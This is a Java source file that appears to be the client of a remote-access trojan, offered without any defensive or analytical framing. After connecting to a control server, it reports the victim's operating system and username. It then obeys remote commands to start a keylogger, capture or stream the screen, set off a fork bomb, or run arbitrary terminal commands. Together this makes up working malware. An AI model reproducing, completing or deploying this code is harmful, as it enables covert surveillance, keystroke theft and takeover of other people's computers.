package app;

import java.io.EOFException;
import java.io.IOException;
import java.net.Socket;
import java.net.SocketException;

import exception.ServerOfflineException;
import keylogger.KeyLogger;
import network.Connection;
import network.Message;
import utils.ClientUtils;
import utils.OsCheck;
import utils.ScreenUtils;
import utils.forkbomb.Bomb;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;
    static boolean isConnected = false;

    public static void main(String[] args) {
        System.out.println("Opa ta na hora de ser haskiado");
        while(true) {
            try {
                beginConnection();
            } catch(ServerOfflineException e) {
                System.out.println("Server desligou agora negao");
            }
        }
    }

    private static void beginConnection() throws ServerOfflineException {
        try {
            connection = new Connection(new Socket("localhost", 27015));
            isConnected = true;
            System.out.println("Connected, boii");
        } catch(IOException e) {
            System.out.println("Server is offline");
            disconnected();
            return;
        }

        MY_OS = OsCheck.getOperatingSystemType();

        Message osMessage = new Message("os", "User is using " + MY_OS.name());
        connection.sendMessage(osMessage);

        Message username = new Message("username", System.getProperty("user.name"));
        connection.sendMessage(username);

        while(true) {
            handleServerCommand();
        }
    }

    private static void handleServerCommand() throws ServerOfflineException {
        String command = null;
        try {
            command = connection.readMessage().getCommand();
        } catch(SocketException | EOFException e) {
            Client.disconnected();
            throw new ServerOfflineException("Server went offline");
        } catch(IOException | ClassNotFoundException ex) {
            ex.printStackTrace();
        }

        switch(command) {
            case "start-keylogger":
                KeyLogger.getInstance(connection).start();
                break;
            case "stop-keylogger":
                KeyLogger.getInstance(connection).stop();
                break;
            case "screen":
                ScreenUtils.sendScreenshot(connection, false);
                break;
            case "start-screenshare":
                ScreenUtils.startScreenShare(connection);
                break;
            case "stop-screenshare":
                ScreenUtils.stopScreenShare();
                break;
            case "bomb":
                try {
                    Bomb.explode(MY_OS);
                } catch(IOException e) {
                    connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                }
                break;
            default:
                ClientUtils.runTerminalCommand(MY_OS, command, connection);
        }
    }

    public static void disconnected() {
        isConnected = false;
    }
}
